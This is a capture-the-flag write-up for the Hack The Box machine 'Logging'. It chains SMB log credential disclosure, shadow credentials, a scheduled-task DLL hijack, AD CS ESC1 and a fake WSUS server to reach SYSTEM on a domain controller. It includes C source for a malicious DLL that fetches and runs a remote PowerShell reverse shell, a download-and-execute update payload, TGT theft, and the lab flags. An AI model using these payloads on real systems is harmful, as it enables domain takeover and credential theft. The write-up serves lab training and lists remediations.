---
title: HTB Logging
slug: htb-logging-writeup
htbId: 888
type: writeup
category: htb
avatar: htb-logging.png
date: 2026-04-19
difficulty: medium
os: windows
readTime: 14 min read
points: 30
tags: [AD, SMB, SHADOW-CREDS, DLL-HIJACK, ADCS, WSUS]
classification: CLASSIFIED-WHITE
summary: Seed creds into SMB log disclosure, shadow credentials pivot, scheduled-task DLL hijack, AD CS ESC1 cert for a fake WSUS endpoint, and a poisoned update to SYSTEM on the DC.
engagement:
  platform: Hack The Box
  target: logging.htb
  ref: 10.129.22.14
  start: 01:15 EDT
  duration: 14 min read
  operator: WDD-01
killchain:
  - { stage: RECON,     sub: "SMB log disclosure",      tag: NXC,     color: warn }
  - { stage: FOOTHOLD,  sub: "shadow creds msa_health$", tag: BLOODYAD, color: warn }
  - { stage: USER,      sub: "DLL hijack jaylee",       tag: MINGW,   color: warn }
  - { stage: ADCS,      sub: "ESC1 UpdateSrv cert",     tag: CERTIPY, color: warn }
  - { stage: SYSTEM,    sub: "fake WSUS on DC01",       tag: GOAL,    color: ok   }
loadout:
  - { tool: nmap,       purpose: recon }
  - { tool: netexec,    purpose: auth }
  - { tool: impacket,   purpose: ad }
  - { tool: bloodyAD,   purpose: shadow-creds }
  - { tool: certipy,    purpose: adcs }
  - { tool: mingw,      purpose: dll-forge }
  - { tool: wsuks,      purpose: wsus-mitm }
  - { tool: evil-winrm, purpose: shell }
remediation:
  - Restrict SMB share ACLs on log directories containing credentials
  - Audit msDS-KeyCredentialLink write permissions on managed service accounts
  - Lock down scheduled task binary paths and DLL search order
  - Remove Enrollee Supplies Subject on AD CS templates with Server Authentication EKU
  - Pin WSUS hostname in DNS with static records or DNSSEC
---

::: stage n=1 label="RECON" title="Seed creds, a Logs share, and a password stuck in last year."

Starting with the seed credentials {red:wallace.everette} / `Welcome2026@`, we validate domain access and enumerate SMB shares.

::: terminal title="shell · operator@kali" lang="bash"
$ netexec smb 10.129.22.14 -u wallace.everette -p 'Welcome2026@' --shares
SMB   10.129.22.14  445  DC01  [+] logging.htb\wallace.everette:Welcome2026@
SMB   10.129.22.14  445  DC01  Share      Permissions  Remark
SMB   10.129.22.14  445  DC01  -----      -----------  ------
SMB   10.129.22.14  445  DC01  ADMIN$                  Remote Admin
SMB   10.129.22.14  445  DC01  C$                      Default share
SMB   10.129.22.14  445  DC01  IPC$       READ         Remote IPC
SMB   10.129.22.14  445  DC01  Logs       READ         Log Files
SMB   10.129.22.14  445  DC01  NETLOGON   READ         Logon server share
SMB   10.129.22.14  445  DC01  SYSVOL     READ         Logon server share
:::

The {warn:Logs} share stands out as non-default. Listing its contents reveals several log files, with `IdentitySync_Trace_20260219.log` being the interesting one.

::: terminal title="shell · operator@kali" lang="bash"
$ netexec smb 10.129.22.14 -u wallace.everette -p 'Welcome2026@' --share Logs --dir .
:::

Downloading and reading through the identity sync trace, a bind credential sits in plaintext:

::: terminal title="IdentitySync_Trace_20260219.log" lang="bash"
BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025"
:::

::: note title="YEAR BUMP"
The log is dated 2026 but the password ends in `2025`. This is a ==yearly password rotation pattern== -- bump the year to `2026` and the credential is live.
:::

::: terminal title="shell · operator@kali" lang="bash"
$ netexec smb 10.129.22.14 -u svc_recovery -p 'Em3rg3ncyPa$$2026'
SMB   10.129.22.14  445  DC01  [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
:::

{ok:Valid}. We now have credentials for {red:svc_recovery}.

:::

::: stage n=2 label="FOOTHOLD" title="Shadow credentials on a managed service account nobody was watching."

Using {red:svc_recovery}, we grab a Kerberos TGT and enumerate writable objects with BloodyAD.

::: terminal title="shell · operator@kali" lang="bash"
$ getTGT.py logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip 10.129.22.14
[*] Saving ticket in svc_recovery.ccache
:::

::: terminal title="shell · operator@kali · bloodyAD" lang="bash"
$ bloodyAD -d logging.htb -k ccache=svc_recovery.ccache \
  -H DC01.logging.htb -i 10.129.22.14 \
  get writable --otype computer --detail
:::

{red:svc_recovery} has write access to the {warn:msDS-KeyCredentialLink} attribute on the {red:msa_health$} managed service account. This is a textbook shadow credentials attack -- we add our own key pair and authenticate as the account.

::: terminal title="shell · operator@kali · shadow creds" lang="bash"
$ bloodyAD -d logging.htb -k ccache=svc_recovery.ccache \
  -H DC01.logging.htb -i 10.129.22.14 \
  add shadowCredentials --path ./loot/msa_health_shadow msa_health$
:::

This yields an NT hash for {red:msa_health$}. Confirming WinRM access:

::: terminal title="shell · operator@kali" lang="bash"
$ netexec winrm 10.129.22.14 -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
WINRM  10.129.22.14  5985  DC01  [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5 (Pwn3d!)
:::

{ok:Pwn3d}. WinRM shell as {red:msa_health$}.

:::

::: stage n=3 label="USER" title="A scheduled task, a zip file, and the loader lock that almost ruined everything."

Poking around the system reveals a scheduled task called {warn:UpdateChecker Agent} that runs every 3 minutes as {red:LOGGING\jaylee.clifton}. The task executes `C:\Program Files\UpdateMonitor\UpdateMonitor.exe`.

The binary reads a zip from `C:\ProgramData\UpdateMonitor\Settings_Update.zip`, extracts `settings_update.dll` to the `bin\` directory, and loads it via `LoadLibrary`. It also calls a `PreUpdateCheck` export from the DLL if it exists.

The key: {red:msa_health$} has ==write access== to `C:\ProgramData\UpdateMonitor\`, so we can drop our own zip containing a malicious DLL.

::: warn title="LOADER LOCK GOTCHA"
You cannot use a standard msfvenom DLL payload here. Both `windows/shell_reverse_tcp` and `windows/exec` will deadlock in `DllMain` due to the Windows loader lock. Any socket operations or complex process creation from `DllMain` will hang `UpdateMonitor.exe`, locking the DLL on disk and preventing future extractions.
:::

The solution is a custom DLL with `mingw` that spawns a child process and returns from `DllMain` immediately:

::: terminal title="dllpayload.c" lang="c"
#include <windows.h>
DWORD WINAPI RunPayload(LPVOID lpParam) {
    WinExec("cmd.exe /c start /B powershell -ep bypass -w hidden -c \
      \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.35:8080/rev.ps1')\"",
      SW_HIDE);
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c start /B powershell -ep bypass -w hidden -c \
          \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.17.35:8080/rev.ps1')\"",
          SW_HIDE);
        Sleep(500);
    }
    return TRUE;
}
__declspec(dllexport) void PreUpdateCheck(void) { }
:::

::: tip
The `PreUpdateCheck` export is required -- `UpdateMonitor.exe` looks for it after loading the DLL. Without it, the binary logs an error and the task fails silently. The `Sleep(500)` gives the child process time to spawn before the parent exits.
:::

Compile, zip, and drop:

::: terminal title="shell · operator@kali" lang="bash"
$ i686-w64-mingw32-gcc -shared -o settings_update.dll dllpayload.c -lkernel32
$ zip -j Settings_Update.zip settings_update.dll
:::

::: terminal title="shell · msa_health$ · upload" lang="bash"
$ netexec winrm 10.129.22.14 -u 'msa_health$' -H '<hash>' \
  -X "Invoke-WebRequest -Uri http://10.10.17.35:8080/Settings_Update.zip \
  -OutFile C:\ProgramData\UpdateMonitor\Settings_Update.zip"
:::

The `rev.ps1` PowerShell script downloads `Rubeus.exe`, runs `tgtdeleg` to grab jaylee's TGT, and POSTs the results back to our HTTP server before opening an interactive shell. Within 3 minutes, the scheduled task fires, extracts our DLL, loads it, and we get a callback as {red:jaylee.clifton}.

::: terminal title="callback · jaylee.clifton" lang="bash"
user=jaylee.clifton host=DC01 exe=True
:::

::: opsec
The `tgtdeleg` trick via Rubeus is critical here -- it captures the delegated TGT for {red:jaylee.clifton} from the scheduled task context. We need this Kerberos ticket for the AD CS enrollment in the next stage.
:::

**User Flag:** `81a3d868fa0aba6cd2b742152127500b`

:::

::: stage n=4 label="ADCS" title="ESC1 on the UpdateSrv template -- a cert for any hostname you want."

{red:jaylee.clifton} is a member of the {warn:IT} group. Running certipy to enumerate AD CS templates:

::: terminal title="shell · operator@kali · certipy" lang="bash"
$ certipy find -u wallace.everette@logging.htb -p 'Welcome2026@' \
  -dc-ip 10.129.22.14 -enabled -stdout
:::

A template called {warn:UpdateSrv} is enrollable by the `IT` group. It has ==Enrollee Supplies Subject== enabled and the {warn:Server Authentication} EKU -- a classic {red:ESC1} misconfiguration. We can request a certificate for any DNS name.

Using jaylee's delegated TGT, we request a certificate with the SAN `wsus.logging.htb`:

::: terminal title="shell · operator@kali · certipy req" lang="bash"
$ KRB5CCNAME=loot/jaylee_tgt.ccache certipy req -k -no-pass \
  -dc-ip 10.129.22.14 -target DC01.logging.htb \
  -ca logging-DC01-CA -template UpdateSrv \
  -dns wsus.logging.htb -out loot/wsus/wsus
:::

Convert the PFX to PEM for use with the WSUS server:

::: terminal title="shell · operator@kali" lang="bash"
$ openssl pkcs12 -in loot/wsus/wsus.pfx -nodes -out loot/wsus/wsus.pem -passin pass:
:::

::: note title="WHY ESC1 MATTERS"
Enrollee Supplies Subject means the requester controls the Subject Alternative Name. Combined with Server Authentication EKU, this lets us mint a TLS certificate that Windows Update will trust for any hostname in the domain -- including `wsus.logging.htb`.
:::

:::

::: stage n=5 label="SYSTEM" title="DNS poisoning, a fake WSUS, and a KB update that runs PsExec."

Checking the registry on DC01 reveals WSUS is configured to point to `https://wsus.logging.htb:8531`. This hostname doesn't resolve yet -- so we create the DNS record ourselves.

::: terminal title="shell · operator@kali · bloodyAD" lang="bash"
$ bloodyAD -d logging.htb -u wallace.everette -p 'Welcome2026@' \
  -H DC01.logging.htb -i 10.129.22.14 \
  add dnsRecord wsus 10.10.17.35
:::

After the DNS zone polling interval (~90 seconds), the record resolves to our attacker IP:

::: terminal title="shell · operator@kali" lang="bash"
$ dig wsus.logging.htb @10.129.22.8 +short
10.10.17.35
:::

Now we stand up `wsuks`, a fake WSUS server that serves a malicious update containing `PsExec64.exe` with our payload. The TLS certificate from AD CS matches the `wsus.logging.htb` hostname, so Windows Update trusts our server without complaint.

::: terminal title="shell · operator@kali · wsuks" lang="bash"
$ python -m wsuks.wsuks --serve-only \
  --WSUS-Server wsus.logging.htb --WSUS-Port 8531 \
  --tls-cert loot/wsus/wsus.pem -I tun0 \
  -c '/accepteula /s cmd.exe /c powershell -ep bypass -w hidden -c \
    "iwr http://10.10.17.35:8080/sys_rev.ps1 -OutFile C:\Windows\Temp\sys_rev.ps1; \
    powershell -ep bypass -File C:\Windows\Temp\sys_rev.ps1"'
:::

Trigger the update scan from our existing WinRM session:

::: terminal title="shell · msa_health$ · trigger" lang="bash"
$ netexec winrm 10.129.22.14 -u 'msa_health$' -H '<hash>' \
  -X 'wuauclt /detectnow; Start-Process UsoClient.exe -ArgumentList "StartScan"'
:::

The DC connects to our fake WSUS, downloads `PsExec64.exe` disguised as a KB update, and executes it as {ok:SYSTEM} with our payload. After a short wait, the callback arrives:

::: terminal title="callback · NT AUTHORITY\SYSTEM" lang="bash"
whoami: nt authority\system
hostname: DC01
:::

{ok:NT AUTHORITY\SYSTEM}. Rooted.

**Root Flag:** `db62eef9e285c5a597275abe1a76d4a1`

:::
